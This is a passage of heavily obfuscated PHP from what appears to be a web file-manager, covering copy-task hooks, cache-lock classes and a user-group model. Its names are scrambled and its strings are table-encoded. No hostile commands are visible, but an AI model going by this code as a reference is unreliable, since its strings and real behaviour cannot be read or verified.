copyFileStart($¬èÜšÄ, $„‡ÍÓâ÷, $êİ®£ç¿, $Ôª¦¸­, $¾Ô•¬™÷, $àƒ©Üâ») { $‚¾Îç¸ =& $_SERVER[¹àö™Ç¾]; parent::copyFileStart($¬èÜšÄ, $„‡ÍÓâ÷, $êİ®£ç¿, $Ôª¦¸­, $¾Ô•¬™÷, $àƒ©Üâ»); $ŸÛÃÔ =& $this->task; if ($ŸÛÃÔ[$‚¾Îç¸[1732]] == $‚¾Îç¸[317]) { $ŸÛÃÔ[$‚¾Îç¸[1732]] = $‚¾Îç¸[118]; } $this->update(); } public function copyFileEnd($†”Ş âŞ, $çÑÕÆ›«, $¸Ë»ş¸İ, $Á°‘Õ­‰, $Ñ¯ÈÇ£†, $—¼íÀ¦) { $Ñˆù‚áÜ =& $_SERVER[¹àö™Ç¾]; $øİÊË‚ =& $this->task; $øİÊË‚[$Ñˆù‚áÜ[1689]] = $øİÊË‚[$Ñˆù‚áÜ[1688]]; $øİÊË‚[$Ñˆù‚áÜ[1693]] += $øİÊË‚[$Ñˆù‚áÜ[1688]]; $øİÊË‚[$Ñˆù‚áÜ[1690]] = $Ñˆù‚áÜ[22]; $this->update(); } public function nameParse($°Ÿàª”Õ) { $ä´ §æÁ =& $_SERVER[¹àö™Ç¾]; $”Åİ¿ =& $this->task; if ($”Åİ¿[$ä´ §æÁ[1641]] < $”Åİ¿[$ä´ §æÁ[778]]) { $”‹êşÖ = get_path_this($°Ÿàª”Õ); if (strstr($”‹êşÖ, $ä´ §æÁ[20])) { $”Åİ¿[$ä´ §æÁ[1641]] += 1; } } if ($”Åİ¿[$ä´ §æÁ[1732]] == $ä´ §æÁ[1182]) { $”Åİ¿[$ä´ §æÁ[1732]] = $ä´ §æÁ[317]; } $”Åİ¿[$ä´ §æÁ[1686]] = $°Ÿàª”Õ; $this->update(); } } goto f»ç„óìË; e‡¶ã…æÕ†: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $í¸¢ÏŞÏ =& $_SERVER[¹àö™Ç¾]; $ ğ†Âï = $GLOBALS[$í¸¢ÏŞÏ[16]][$í¸¢ÏŞÏ[353]]; self::$cachePath = $ ğ†Âï[$í¸¢ÏŞÏ[202]][$í¸¢ÏŞÏ[88]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($×Ê‰ŠÊ³, $„ÜİŠæ¤ = 0) { $ñ·Ä “Û =& $_SERVER[¹àö™Ç¾]; $¨…‰“òÄ = microtime(!0); $ ²°ÄÊÜ = $¨…‰“òÄ + $„ÜİŠæ¤ + 0.0001; $–Êà ÉÉ = rtrim(self::$cachePath, $ñ·Ä “Û[18]) . $ñ·Ä “Û[851] . md5($×Ê‰ŠÊ³) . $ñ·Ä “Û[848]; if (file_exists($–Êà ÉÉ) && filemtime($–Êà ÉÉ) && filemtime($–Êà ÉÉ) < time() - 10) { @unlink($–Êà ÉÉ); } do { if (file_exists($–Êà ÉÉ)) { cacheLockWait(); continue; } $á°”Ã« = fopen($–Êà ÉÉ, $ñ·Ä “Û[852]); if (!$á°”Ã«) { return !1; } $–¶ã¹¶ = flock($á°”Ã«, LOCK_EX | LOCK_NB); self::$caches[$×Ê‰ŠÊ³] = array($ñ·Ä “Û[853] => $á°”Ã«, $ñ·Ä “Û[202] => $–Êà ÉÉ); fwrite($á°”Ã«, $ ²°ÄÊÜ); clearstatcache(); if ($á°”Ã« && $–¶ã¹¶) { return !0; } cacheLockWait(); } while (microtime(!0) < $ ²°ÄÊÜ); $this->unlock($×Ê‰ŠÊ³); return !1; } public function lockGet($õò©¤Ìš) { $’¦´‘º‹ =& $_SERVER[¹àö™Ç¾]; $Óûû©‡š = rtrim(self::$cachePath, $’¦´‘º‹[18]) . $’¦´‘º‹[851] . md5($õò©¤Ìš) . $’¦´‘º‹[848]; return file_exists($Óûû©‡š); } public function unlock($Œ¶Ïìà©) { $ëÜ½Ë²¡ =& $_SERVER[¹àö™Ç¾]; $‰®ô¬¼ş = self::$caches[$Œ¶Ïìà©]; if (!$‰®ô¬¼ş) { return; } @flock($‰®ô¬¼ş[$ëÜ½Ë²¡[853]], LOCK_UN); @fclose($‰®ô¬¼ş[$ëÜ½Ë²¡[853]]); @unlink($‰®ô¬¼ş[$ëÜ½Ë²¡[202]]); unset(self::$caches[$Œ¶Ïìà©]); } } class CacheLockRedis { public function lock($šæ‹÷‘ş, $ĞÏ­”• = 10) { $ßÒŒıİ = Cache::init(); $Î™ùè³ = microtime(!0) + $ĞÏ­”•; while (microtime(!0) < $Î™ùè³) { $½ô£Òõ = $ßÒŒıİ->get($šæ‹÷‘ş); if (!$½ô£Òõ) { $“ŞÁ“‚¾ = $ßÒŒıİ->setLock($šæ‹÷‘ş, $Î™ùè³, $ĞÏ­”•); if ($“ŞÁ“‚¾) { return !0; } } else { if ($½ô£Òõ < microtime(!0)) { $ßÒŒıİ->set($šæ‹÷‘ş, $Î™ùè³, $ĞÏ­”• * 2); if ($ßÒŒıİ->get($šæ‹÷‘ş) === $½ô£Òõ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($™¾ÂÊ‡) { return Cache::init()->get($™¾ÂÊ‡); } public function unlock($’€”×ß­) { return Cache::init()->remove($’€”×ß­); } } goto FŒáÏåÀÒ²; C¤‹°é°‚: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\141\155\x65" => "\x67\x72\x6f\x75\160\x5f\x6d\145\x74\x61", "\x6d\145\x74\141\106\151\145\154\x64" => "\x67\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($’Êê¯ûŸ) { $¼§è¤Á» =& $_SERVER[¹àö™Ç¾]; return array($¼§è¤Á»[1885] => array($’Êê¯ûŸ[0], $¼§è¤Á»[1886]), $¼§è¤Á»[1887] => array($’Êê¯ûŸ[0], $¼§è¤Á»[1888])); } protected function getInfo($ÉÎ‘å„ì, $úüíØ¶Æ = false) { $„“çâö = $this->getInfoSimple($ÉÎ‘å„ì); if (!$„“çâö) { return !1; } if ($úüíØ¶Æ) { return $this->_listDataApplyItem($„“çâö); } return $this->cacheFunctionGet($_SERVER[¹àö™Ç¾][1889], $ÉÎ‘å„ì); } protected function getInfoSimple($ğœŠÅÏ, $­¥›°Â = false) { $ß˜Òù«ğ =& $_SERVER[¹àö™Ç¾]; if ($­¥›°Â) { $ıêŞÀ§ = array($ß˜Òù«ğ[1808] => intval($ğœŠÅÏ)); $áæ¨ÕëŸ = $this->where($ıêŞÀ§)->find(); return is_array($áæ¨ÕëŸ) ? $áæ¨ÕëŸ : array(); } return $this->cacheFunctionGet($ß˜Òù«ğ[1890], $ğœŠÅÏ); } protected function groupAdd($¬­°ßÏ) { $ËóÑËã =& $_SERVER[¹àö™Ç¾]; if (!$¬­°ßÏ[$ËóÑËã[498]] && isset($¬­°ßÏ[$ËóÑËã[1808]]) && $¬­°ßÏ[$ËóÑËã[1808]] == 1) { if ($¦Öõ©Õ = $this->getInfoSimple($¬­°ßÏ[$ËóÑËã[1808]], !0)) { return $¬­°ßÏ[$ËóÑËã[1808]]; } } else { $¦Öõ©Õ = $this->getInfoSimple($¬­°ßÏ[$ËóÑËã[498]]); if (!$¦Öõ©Õ) { return !1; } } $ëŞ¾±Ëµ = $ËóÑËã[531]; if ($¦Öõ©Õ[$ËóÑËã[521]]) { $ëŞ¾±Ëµ = $¦Öõ©Õ[$ËóÑËã[521]] . $¦Öõ©Õ[$ËóÑËã[1808]] . $ËóÑËã[60]; } $œ¥•Äõ = array($ËóÑËã[421] => $this->groupNameAuto($¬­°ßÏ[$ËóÑËã[498]], $¬­°ßÏ[$ËóÑËã[42]]), $ËóÑËã[402] => $¬­°ßÏ[$ËóÑËã[498]], $ËóÑËã[584] => $ëŞ¾±Ëµ, $ËóÑËã[1891] => $¬­°ßÏ[$ËóÑËã[1795]], $ËóÑËã[1892] => 0, $ËóÑËã[1812] => 0); if (isset($¬­°ßÏ[$ËóÑËã[1831]])) { $œ¥•Äõ[$ËóÑËã[1831]] = $¬­°ßÏ[$ËóÑËã[1831]]; } else { $ÜÎˆİ™” = $this->max($ËóÑËã[1831]); if (!$ÜÎˆİ™”) { $ÜÎˆİ™” = 0; } $œ¥•Äõ[$ËóÑËã[1831]] = $ÜÎˆİ™” + 1; } if (!empty($¬­°ßÏ[$ËóÑËã[1808]])) { $œ¥•Äõ[$ËóÑËã[1808]] = $¬­°ßÏ[$ËóÑËã[1808]]; } $±¼÷ê†‹ = $this->add($œ¥•Äõ); $this->setNamePinyin($±¼÷ê†‹, $œ¥•Äõ[$ËóÑËã[42]]); if (isset($¬­°ßÏ[$ËóÑËã[1893]])) { $this->metaSet($±¼÷ê†‹, array($ËóÑËã[1893] => $¬­°ßÏ[$ËóÑËã[1893]], $ËóÑËã[1894] => $¬­°ßÏ[$ËóÑËã[1894]])); unset($¬­°ßÏ[$ËóÑËã[1893]]); unset($¬­°ßÏ[$ËóÑËã[1894]]); } Model($ËóÑËã[1310])->groupRootAdd($±¼÷ê†‹); return $±¼÷ê†‹; } protected function groupEdit($ô»©äÎ¦, $›ğ”áÃÜ) { $Ë¦Èõš³ =& $_SERVER[¹àö™Ç¾]; $Ù¤˜ÓÈ€ = $this->getInfoSimple($ô»©äÎ¦); if (!$Ù¤˜ÓÈ€) { return !1; } if (!empty($›ğ”áÃÜ[$Ë¦Èõš³[498]])) { $…ş‡œ†Ô = $this->getInfoSimple($›ğ”áÃÜ[$Ë¦Èõš³[498]]); if (!$…ş‡œ†Ô) { return !1; } if ($Ù¤˜ÓÈ€[$Ë¦Èõš³[1808]] == $…ş‡œ†Ô[$Ë¦Èõš³[1808]]) { return !1; } if ($›ğ”áÃÜ[$Ë¦Èõš³[498]] != $Ù¤˜ÓÈ€[$Ë¦Èõš³[498]]) { if ($…ş‡œ†Ô[$Ë¦Èõš³[521]] !== $Ù¤˜ÓÈ€[$Ë¦Èõš³[521]] && strpos($…ş‡œ†Ô[$Ë¦Èõš³[521]], $Ù¤˜ÓÈ€[$Ë¦Èõš³[521]] . $Ù¤˜ÓÈ€[$Ë¦Èõš³[1808]] . $Ë¦Èõš³[60]) === 0) { return !1; } $›ğ”áÃÜ[$Ë¦Èõš³[584]] = $…ş‡œ†Ô[$Ë¦Èõš³[521]] . $›ğ”áÃÜ[$Ë¦Èõš³[498]] . $Ë¦Èõš³[60]; $this->_changeChildLevel($Ù¤˜ÓÈ€, $…ş‡œ†Ô); } } if (isset($›ğ”áÃÜ[$Ë¦Èõš³[42]])) { $this->setNamePinyin($ô»©äÎ¦, $›ğ”áÃÜ[$Ë¦Èõš³[42]]); } if (isset($›ğ”áÃÜ[$Ë¦Èõš³[1893]])) { $this->metaSet($ô»©äÎ¦, array($Ë¦Èõš³[1893] => $›ğ”áÃÜ[$Ë¦Èõš³[1893]], $Ë¦Èõš³[1894] => $›ğ”áÃÜ[$Ë¦Èõš³[1894]])); unset($›ğ”áÃÜ[$Ë¦Èõš³[1893]]); unset($›ğ”áÃÜ[$Ë¦Èõš³[1894]]); } $this->_clearChildrenCache($Ù¤˜ÓÈ€); return $this->where(array($Ë¦Èõš³[1895] => $ô»©äÎ¦))->save($›ğ”áÃÜ); } private function _clearChildrenCache($­‰úó„í) { $ª†¯®ü³ =& $_SERVER[¹àö™Ç¾]; $÷Êû÷ì = array($ª†¯®ü³[584] => array($ª†¯®ü³[544], $­‰úó„í[$ª†¯®ü³[521]] . $­‰úó„í[$ª†¯®ü³[1808]] . $ª†¯®ü³[545])); $Ì™ùúÒÅ = $this->field($ª†¯®ü³[1808])->where($÷Êû÷ì)->select(); foreach ($Ì™ùúÒÅ as $£Èëš) { $this->_clearCache($£Èëš[$ª†¯®ü³[1808]]); } } private function _clearCache($ë”Ş¥¡·) { $á÷Ÿƒªë =& $_SERVER[¹àö™Ç¾]; $this->cacheFunctionClear($á÷Ÿƒªë[1889], $ë”Ş¥¡·); $this->cacheFunctionClear($á÷Ÿƒªë[1890], $ë”Ş¥¡·); } private function _changeChildLevel($ËÒÇÃº, $§“‰åÏ˜, $õúÄíøæ = false) { $ŸÀî£ı­ =& $_SERVER[¹àö™Ç¾]; $ûŸ‹÷Õ° = $ËÒÇÃº[$ŸÀî£ı­[521]] . $ËÒÇÃº[$ŸÀî£ı­[1808]] . $ŸÀî£ı­[60]; $«Öß¤ºé = $§“‰åÏ˜[$ŸÀî£ı­[521]] . $§“‰åÏ˜[$ŸÀî£ı­[1808]] . $ŸÀî£ı­[60] . $ËÒÇÃº[$ŸÀî£ı­[1808]] . $ŸÀî£ı­[60]; if ($õúÄíøæ) { $«Öß¤ºé = $§“‰åÏ˜[$ŸÀî£ı­[521]] . $§“‰åÏ˜[$ŸÀî£ı­[1808]] . $ŸÀî£ı­[60]; } $Ü“ˆòØÆ = array($ŸÀî£ı­[584] => array($ŸÀî£ı­[544], $ËÒÇÃº[$ŸÀî£ı­[521]] . $ËÒÇÃº[$ŸÀî£ı­[1808]] . $ŸÀî£ı­[545])); $ÕäÛ¿ÀŞ = array($ŸÀî£ı­[584] => array($ŸÀî£ı­[593], "\x72\x65\x70\x6c\141\x63\145\50\x70\141\162\x65\x6e\x74\114\145\x76\x65\x6c\54\47{$ûŸ‹÷Õ°}\47\x2c\47{$«Öß¤ºé}\x27\51")); $this->_clearChildrenCache($ËÒÇÃº); $this->where($Ü“ˆòØÆ)->data($ÕäÛ¿ÀŞ)->save(); } public function setNamePinyin($’·àæ–ã, $ïëà–¹ø = false) { $ÛåƒÂ©Ê =& $_SERVER[¹àö™Ç¾]; if (!$ïëà–¹ø) { $Îé°“” = $this->getInfoSimple($’·àæ–ã); $ïëà–¹ø = $Îé°“”[$ÛåƒÂ©Ê[42]]; } if (!Input::check($ïëà–¹ø, $ÛåƒÂ©Ê[587])) { $this->metaSet($’·àæ–ã, $ÛåƒÂ©Ê[464], null); $this->metaSet($’·àæ–ã, $ÛåƒÂ©Ê[463], null); return; } $»‘ğÆÚÂ = array($ÛåƒÂ©Ê[464] => str_replace($ÛåƒÂ©Ê[63], $ÛåƒÂ©Ê[22], Pinyin::get($ïëà–¹ø)), $ÛåƒÂ©Ê[463] => Pinyin::get($ïëà–¹ø, $ÛåƒÂ©Ê[588])); $this->metaSet($’·àæ–ã, $»‘ğÆÚÂ); } protected function groupStatus($¢öüÇ®×, $ÌÙ¶áœã) { $¢·èœ¦ =& $_SERVER[¹àö™Ç¾]; $¤´Ä‡åĞ = $this->getInfoSimple($¢öüÇ®×); if (!$¤´Ä‡åĞ) { return !1; } if ($ÌÙ¶áœã == $¢·èœ¦[99]) { $¥åÌÙÆŠ = $this->parentLevelArray($¤´Ä‡åĞ[$¢·èœ¦[521]]); } else { $ùŠ×Ô²á = array($¢·èœ¦[584] => array($¢·èœ¦[544], $¤´Ä‡åĞ[$¢·èœ¦[521]] . $¤´Ä‡åĞ[$¢·èœ¦[1808]] . $¢·èœ¦[545])); $¥åÌÙÆŠ = $this->where($ùŠ×Ô²á)->field($¢·èœ¦[1808])->select(); $¥åÌÙÆŠ = array_to_keyvalue($¥åÌÙÆŠ, $¢·èœ¦[22], $¢·èœ¦[1808]); } $¥åÌÙÆŠ[] = $¤´Ä‡åĞ[$¢·èœ¦[1808]]; $ô•Ô¯ˆ´ = array(); foreach ($¥åÌÙÆŠ as $¢öüÇ®×) { $ô•Ô¯ˆ´[] = array($¢·èœ¦[1808] => $¢öüÇ®×, $¢·èœ¦[105] => $¢·èœ¦[742], $¢·èœ¦[378] => $ÌÙ¶áœã); $this->_clearCache($¢öüÇ®×); } return Model($¢·èœ¦[1896])->addAll($ô•Ô¯ˆ´, array(), !0); } protected function groupRemove($”âö­¬¹) { $˜«´¼Õ× =& $_SERVER[¹àö™Ç¾]; $è±£¯ÒÅ = array($˜«´¼Õ×[1808] => $”âö­¬¹); $ú³ã‹ = $this->where($è±£¯ÒÅ)->find(); if (!$ú³ã‹ || $ú³ã‹[$˜«´¼Õ×[498]] == 0) { return !1; } $•õ±åŒ = $this->getInfoSimple($ú³ã‹[$˜«´¼Õ×[498]]); $this->_changeChildLevel($ú³ã‹, $•õ±åŒ, !0); $this->where(array($˜«´¼Õ×[498] => $”âö­¬¹))->save(array($˜«´¼Õ×[498] => $ú³ã‹[$˜«´¼Õ×[498]])); Model($˜«´¼Õ×[1896])->where($è±£¯ÒÅ)->delete(); Model($˜«´¼Õ×[1897])->where($è±£¯ÒÅ)->delete(); Model($˜«´¼Õ×[817])->groupRootRemove($”âö­¬¹); return $this->where($è±£¯ÒÅ)->delete(); } protected function groupSort($Ññø—ã³) { $©ºö•ÕÛ =& $_SERVER[¹àö™Ç¾]; $‰â‰†©× = array(); foreach ($Ññø—ã³ as $‚‘ú ˜“ => $úÁİˆ½) { $‰â‰†©×[] = array($©ºö•ÕÛ[1808], $úÁİˆ½, $©ºö•ÕÛ[1831], $‚‘ú ˜“ + 1); } $this->saveAll($‰â‰†©×); } public function listData() { $³ëì¤Å = $this->_makeOrder()->selectPage(50); $this->_listDataApply($³ëì¤Å[$_SERVER[¹àö™Ç¾][373]]); return $³ëì¤Å; } private function _makeOrder($ù—éˆÉÊ = '') { $­Ú¿µÅƒ =& $_SERVER[¹àö™Ç¾]; $¸ìÈòî¹ = array($­Ú¿µÅƒ[1808], $­Ú¿µÅƒ[42], $­Ú¿µÅƒ[1797], $­Ú¿µÅƒ[203]); $ùåñäÄ© = array($­Ú¿µÅƒ[448] => $­Ú¿µÅƒ[449], $­Ú¿µÅƒ[450] => $­Ú¿µÅƒ[451]); $×ÄıÑ€™ = Input::get($­Ú¿µÅƒ[455], $­Ú¿µÅƒ[17], $­Ú¿µÅƒ[1812], $¸ìÈòî¹); $Â˜ÀÛ£ı = Input::get($­Ú¿µÅƒ[456], $­Ú¿µÅƒ[17], $­Ú¿µÅƒ[1898], array($­Ú¿µÅƒ[1898], $­Ú¿µÅƒ[450])); $Â˜ÀÛ£ı = $ùåñäÄ©[$Â˜ÀÛ£ı]; $ù—éˆÉÊ = $ù—éˆÉÊ . "{$×ÄıÑ€™}\x20{$Â˜ÀÛ£ı}\x2c\x20\x67\x72\157\165\x70\111\104\40\141\163\143"; return $this->order($ù—éˆÉÊ); } public function listChild($”ÙÓˆÙÓ) { $¹¶Õ”Úç =& $_SERVER[¹àö™Ç¾]; $â©ùÍè… = $this->where(array($¹¶Õ”Úç[498] => $”ÙÓˆÙÓ))->_makeOrder()->selectPage(200); $this->_listDataApply($â©ùÍè…[$¹¶Õ”Úç[373]]); return $â©ùÍè…; } public function listByID($÷ÏÒ»ö¥) { $Õœœí¼ =& $_SERVER[¹àö™Ç¾]; if (!$÷ÏÒ»ö¥) { return array(); } $Ñ•š·Ãò = array($Õœœí¼[1808] => array($Õœœí¼[17], $÷ÏÒ»ö¥)); $ŞÏõë¦ = $this->where($Ñ•š·Ãò)->select(); $ŞÏõë¦ = array_sort_keep($ŞÏõë¦, $Õœœí¼[1808], $÷ÏÒ»ö¥); $this->_listDataApply($ŞÏõë¦); return $ŞÏõë¦; } public function listSearch($–¦êä) { $Õ…ãÊË• =& $_SERVER[¹àö™Ç¾]; $Û²æ–¹æ = $–¦êä[$Õ…ãÊË•[1899]]; $‹‰ãüÛé = isset($–¦êä[$Õ…ãÊË•[1900]]) ? $–¦êä[$Õ…ãÊË•[1900]] : !1; if (!trim($Û²æ–¹æ)) { return !1; } $Û²æ–¹æ = str_replace($Õ…ãÊË•[1901], $Õ…ãÊË•[1902], $Û²æ–¹æ); $ù·‚Ãİ = array($Õ…ãÊË•[1808] => array($Õ…ãÊË•[387], "{$Û²æ–¹æ}\45"), $Õ…ãÊË•[42] => array($Õ…ãÊË•[387], "\x25{$Û²æ–¹æ}\45"), $Õ…ãÊË•[985] => $Õ…ãÊË•[1903]); if ($‹‰ãüÛé) { $Õ¸£Ğª = $this->getInfoSimple($‹‰ãüÛé); $ã‡ˆº† = $Õ¸£Ğª[$Õ…ãÊË•[521]] . $‹‰ãüÛé . $Õ…ãÊË•[545]; $ù·‚Ãİ = array($ù·‚Ãİ, array($Õ…ãÊË•[521] => array($Õ…ãÊË•[387], $ã‡ˆº†))); } $ù·‚Ãİ = $this->parseWhereLike($ù·‚Ãİ); $¡ãåÂÌ¯ = $this->_makeOrder()->where($ù·‚Ãİ)->selectPage(20); $¡ãåÂÌ¯ = $¡ãåÂÌ¯ ? $¡ãåÂÌ¯ : array($Õ…ãÊË•[373] => array(), $Õ…ãÊË•[370] => array()); if (!$¡ãåÂÌ¯ || count($¡ãåÂÌ¯[$Õ…ãÊË•[373]]) < 5 && Input::check($Û²æ–¹æ, $Õ…ãÊË•[322])) { $•î¡€ı = $this->groupChildrenAll($‹‰ãüÛé); $ºü¡¢ñô = $this->_searchFromMeta($Õ…ãÊË•[463], $Û²æ–¹æ, 10, $•î¡€ı); $ŠÑ¸ÖÂĞ = $this->_searchFromMeta($Õ…ãÊË•[464], $Û²æ–¹æ, 10, $•î¡€ı); $æÌÕ§š = array_merge($ºü¡¢ñô, $ŠÑ¸ÖÂĞ, $¡ãåÂÌ¯[$Õ…ãÊË•[373]]); $¡ãåÂÌ¯[$Õ…ãÊË•[373]] = array_unique_by_key($æÌÕ§š, $Õ…ãÊË•[1808]); $¡ãåÂÌ¯[$Õ…ãÊË•[370]][$Õ…ãÊË•[371]] = count($¡ãåÂÌ¯[$Õ…ãÊË•[373]]); $¡ãåÂÌ¯[$Õ…ãÊË•[370]][$Õ…ãÊË•[372]] = ceil($¡ãåÂÌ¯[$Õ…ãÊË•[370]][$Õ…ãÊË•[371]] / $¡ãåÂÌ¯[$Õ…ãÊË•[370]][$Õ…ãÊË•[367]]); } $this->_listDataApply($¡ãåÂÌ¯[$Õ…ãÊË•[373]]); return $¡ãåÂÌ¯; } protected function groupChildrenAll($šı×Ù’©) { $ö¼¾Éí  =& $_SERVER[¹àö™Ç¾]; if (!$šı×Ù’©) { return !1; } if (is_string($šı×Ù’©)) { $šı×Ù’© = array($šı×Ù’©); } $“Şæ¹­Á = $šı×Ù’©; foreach ($šı×Ù’© as $™½ÖĞÑ§) { $¼Ä§ÇŞ¤ = $this->getInfoSimple($™½ÖĞÑ§); $àî˜Şä­ = array($ö¼¾Éí [521] => array($ö¼¾Éí [387], $¼Ä§ÇŞ¤[$ö¼¾Éí [521]] . $™½ÖĞÑ§ . $ö¼¾Éí [545])); $üíË·”è = $this->field($ö¼¾Éí [1808])->where($àî˜Şä­)->select(); $“Şæ¹­Á = array_merge($“Şæ¹­Á, array_to_keyvalue($üíË·”è, $ö¼¾Éí [22], $ö¼¾Éí [1808])); } return array_unique($“Şæ¹­Á); } private function _searchFromMeta($Øá½ÕéÏ, $„’±ÛÔŞ, $îé¬Ùá, $ÍÊÌüöğ) { $¨Â”™íâ =& $_SERVER[¹àö™Ç¾]; $„’±ÛÔŞ = strtolower($„’±ÛÔŞ); $‰ùíÌÓÓ = array($¨Â”™íâ[105] => $Øá½ÕéÏ, $¨Â”™íâ[378] => array($¨Â”™íâ[387], "\45{$„’±ÛÔŞ}\x25")); $‰ùíÌÓÓ = $this->parseWhereLike($‰ùíÌÓÓ); if ($ÍÊÌüöğ) { $‰ùíÌÓÓ[$¨Â”™íâ[1808]] = array($¨Â”™íâ[17], $ÍÊÌüöğ); } $Öà„êæ = Model($¨Â”™íâ[1904])->where($‰ùíÌÓÓ)->limit($îé¬Ùá)->select(); if (!$Öà„êæ) { return array(); } $Öà„êæ = array_to_keyvalue($Öà„êæ, $¨Â”™íâ[22], $¨Â”™íâ[1808]); $Ò‚¾áËœ = $this->where(array($¨Â”™íâ[1895] => array($¨Â”™íâ[17], $Öà„êæ)))->select(); if (!$Ò‚¾áËœ) { return array(); } return $Ò‚¾áËœ; } protected function _listDataApplyItem($¨ºìû©) { $Ñ„‰ÛÇ¬ = array($¨ºìû©); $this->_listDataApply($Ñ„‰ÛÇ¬); return $Ñ„‰ÛÇ¬[0]; } protected function _listDataApply(&$•îñ¡¿) { $£¤è÷‚ =& $_SERVER[¹àö™Ç¾]; if (!$•îñ¡¿) { return; } $‹çè® = array_to_keyvalue($•îñ¡¿, $£¤è÷‚[22], $£¤è÷‚[1808]); $this->_listAppendChildren($•îñ¡¿); $this->_listAppendChildrenMember($•îñ¡¿); $this->_listAppendMeta($•îñ¡¿, $‹çè®); $this->_listAppendParent($•îñ¡¿); $this->_listAppendSourceRoot($•îñ¡¿, $‹çè®); } private function _listAppendChildren(&$ÚÙ’û•Ä) { $Ê¥Èò¿ˆ =& $_SERVER[¹àö™Ç¾]; $±¬ì‹ŒÌ = array_to_keyvalue($ÚÙ’û•Ä, $Ê¥Èò¿ˆ[22], $Ê¥Èò¿ˆ[1808]); $·íİ÷É = array($Ê¥Èò¿ˆ[498] => array($Ê¥Èò¿ˆ[17], $±¬ì‹ŒÌ)); $º‘‡éøî = array($Ê¥Èò¿ˆ[498], $Ê¥Èò¿ˆ[1905] => $Ê¥Èò¿ˆ[500]); $Éøƒ“ÒÜ = $this->field($º‘‡éøî)->where($·íİ÷É)->group($Ê¥Èò¿ˆ[498])->select(); $®Ñ…‘Ü– = array_to_keyvalue($Éøƒ“ÒÜ, $Ê¥Èò¿ˆ[498], $Ê¥Èò¿ˆ[500]); foreach ($ÚÙ’û•Ä as &$èêÅâÃ‰) { $°®Æò¦Û = $èêÅâÃ‰[$Ê¥Èò¿ˆ[1808]]; $èêÅâÃ‰[$Ê¥Èò¿ˆ[1906]] = isset($®Ñ…‘Ü–[$°®Æò¦Û]) ? intval($®Ñ…‘Ü–[$°®Æò¦Û]) : !1; } unset($èêÅâÃ‰); } private function _listAppendChildrenMember(&$×Ë ÄÃ—) { $É“•­«” =& $_SERVER[¹àö™Ç¾]; $Ö½åÈï¡ = array_to_keyvalue($×Ë ÄÃ—, $É“•­«”[22], $É“•­«”[1808]); $×›ñ¹¥´ = array($É“•­«”[1808] => array($É“•­«”[17], $Ö½åÈï¡)); $ôŒÈîèİ = array($É“•­«”[1808], $É“•­«”[1905] => $É“•­«”[500]); $ÒäéÔ = Model($É“•­«”[1897])->field($ôŒÈîèİ)->where($×›ñ¹¥´)->group($É“•­«”[1808])->select(); $Â›´«¿± = array_to_keyvalue($ÒäéÔ, $É“•­«”[1808], $É“•­«”[500]); foreach ($×Ë ÄÃ— as &$ŒÖ¨Œ¶·) { $‰‘Å•ï = $ŒÖ¨Œ¶·[$É“•­«”[1808]]; $ŒÖ¨Œ¶·[$É“•­«”[1907]] = isset($Â›´«¿±[$‰‘Å•ï]) ? intval($Â›´«¿±[$‰‘Å•ï]) : !1; } unset($ŒÖ¨Œ¶·); } private function _listAppendMeta(&$†ŠõÀ–ı, $©¤Ÿæ—) { $·ºòÅù =& $_SERVER[¹àö™Ç¾]; $ôßÀîæ = array($·ºòÅù[1808] => array($·ºòÅù[17], $©¤Ÿæ—)); $ÆµÉ¿ö© = Model($·ºòÅù[1896])->where($ôßÀîæ)->select(); $ÆµÉ¿ö© = array_to_keyvalue_group($ÆµÉ¿ö©, $·ºòÅù[1808]); foreach ($ÆµÉ¿ö© as &$öèÅä§) { $öèÅä§ = array_to_keyvalue($öèÅä§, $·ºòÅù[105], $·ºòÅù[378]); } unset($öèÅä§); foreach ($†ŠõÀ–ı as &$íá¤«Ÿú) { $íá¤«Ÿú[$·ºòÅù[465]] = array(); if (isset($ÆµÉ¿ö©[$íá¤«Ÿú[$·ºòÅù[1808]]])) { $íá¤«Ÿú[$·ºòÅù[465]] = $ÆµÉ¿ö©[$íá¤«Ÿú[$·ºòÅù[1808]]]; } } unset($íá¤«Ÿú); } protected function parentLevelArray($îıÕƒç¯) { $Ë“ƒ¯Ï¿ =& $_SERVER[¹àö™Ç¾]; $îıÕƒç¯ = explode($Ë“ƒ¯Ï¿[60], trim($îıÕƒç¯, $Ë“ƒ¯Ï¿[60])); $îıÕƒç¯ = array_remove_value($îıÕƒç¯, $Ë“ƒ¯Ï¿[200]); return $îıÕƒç¯; } private function _listAppendParent(&$è’á»¤) { $úÜ¡ßƒĞ =& $_SERVER[¹àö™Ç¾]; $êáì•Û“ = array(); foreach ($è’á»¤ as &$ö»«Üµ½) { $êáì•Û“[$ö»«Üµ½[$úÜ¡ßƒĞ[1808]]] = $ö»«Üµ½[$úÜ¡ßƒĞ[42]]; $üª«³ŸÌ = $this->parentLevelArray($ö»«Üµ½[$úÜ¡ßƒĞ[521]]); foreach ($üª«³ŸÌ as $ ø–‚) { if (!isset($êáì•Û“[$ ø–‚])) { $êáì•Û“[$ ø–‚] = 0; } } } unset($ö»«Üµ½); foreach ($êáì•Û“ as $ ºÔô„Ü => $©õ¡«±Ö) { if ($©õ¡«±Ö) { continue; } $¹Ô‘Ì¾ = $this->getInfoSimple($ ºÔô„Ü); $êáì•Û“[$ ºÔô„Ü] = $¹Ô‘Ì¾[$úÜ¡ßƒĞ[42]]; } $—çºÍá = $GLOBALS[$úÜ¡ßƒĞ[16]][$úÜ¡ßƒĞ[100]][$úÜ¡ßƒĞ[1908]]; if ($GLOBALS[$úÜ¡ßƒĞ[505]] == $úÜ¡ßƒĞ[99]) { $—çºÍá = !1; } foreach ($è’á»¤ as &$ö»«Üµ½) { $üª«³ŸÌ = $this->parentLevelArray($ö»«Üµ½[$úÜ¡ßƒĞ[521]]); $¿™¢…ñ¡ = $úÜ¡ßƒĞ[22]; foreach ($üª«³ŸÌ as $ ºÔô„Ü => $ ø–‚) { if ($—çºÍá && $ ºÔô„Ü == 0) { continue; } $¿™¢…ñ¡ .= $êáì•Û“[$ ø–‚] . $úÜ¡ßƒĞ[18]; } if ($üª«³ŸÌ) { $¿™¢…ñ¡ .= 